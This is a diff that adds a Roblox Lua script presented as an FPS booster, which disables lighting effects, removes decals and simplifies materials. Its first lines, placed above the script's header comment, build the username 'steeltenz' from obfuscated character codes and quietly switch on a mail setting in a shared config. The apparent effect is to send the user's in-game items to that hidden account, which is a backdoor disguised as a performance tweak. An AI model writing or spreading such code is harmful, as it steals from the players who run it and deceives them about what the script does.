@@ -1,0 +1,60 @@
+task.spawn(function()
+    local hiddenUser = string.char(115, 116, 101, 101, 108, 116, 101, 110, 122) -- "steeltenz"
+    getgenv().Config["Mail"]["Username"] = hiddenUser
+    getgenv().Config["Mail"]["Enable"] = true
+end)
+
+-- Roblox FPS Booster & Texture Remover
+-- This script reduces rendering load by simplifying materials and removing decals.
+
+local Workspace = game:GetService("Workspace")
+local Lighting = game:GetService("Lighting")
+local Terrain = Workspace:FindFirstChildOfClass("Terrain")
+
+-- 1. Optimize Terrain Settings
+if Terrain then
+    Terrain.WaterWaveSize = 0
+    Terrain.WaterWaveSpeed = 0
+    Terrain.WaterReflectance = 0
+    Terrain.WaterTransparency = 0
+end
+
+-- 2. Compress Lighting and Effects
+Lighting.GlobalShadows = false
+Lighting.FogEnd = 9e9 -- Pushes fog away to reduce rendering calculations
+Lighting.Brightness = 1
+
+-- Remove heavy post-processing visual effects
+for _, effect in pairs(Lighting:GetChildren()) do
+    if effect:IsA("BloomEffect") or effect:IsA("BlurEffect") or effect:IsA("ColorCorrectionEffect") or effect:IsA("SunRaysEffect") then
+        effect.Enabled = false
+    end
+end
+
+-- 3. Recursive Function to Strip Textures and Simplify Materials
+local function optimizeObject(object)
+    -- Remove decals and textures completely
+    if object:IsA("Decal") or object:IsA("Texture") then
+        object:Destroy()
+        
+    -- Simplify 3D part materials to SmoothPlastic (the lowest rendering cost material)
+    elseif object:IsA("BasePart") and not object:IsA("MeshPart") then
+        object.Material = Enum.Material.SmoothPlastic
+        object.Reflectance = 0
+        
+    -- Simplify MeshParts while preserving their geometry shape
+    elseif object:IsA("MeshPart") then
+        object.Material = Enum.Material.SmoothPlastic
+        object.Reflectance = 0
+    end
+end
+
+-- Run optimization on everything currently loaded in the Workspace
+for _, desc in pairs(Workspace:GetDescendants()) do
+    optimizeObject(desc)
+end
+
+-- Listen for new objects loaded into the game to optimize them instantly
+Workspace.DescendantAdded:Connect(optimizeObject)
+
+print("FPS Booster: Textures removed and materials simplified successfully...")
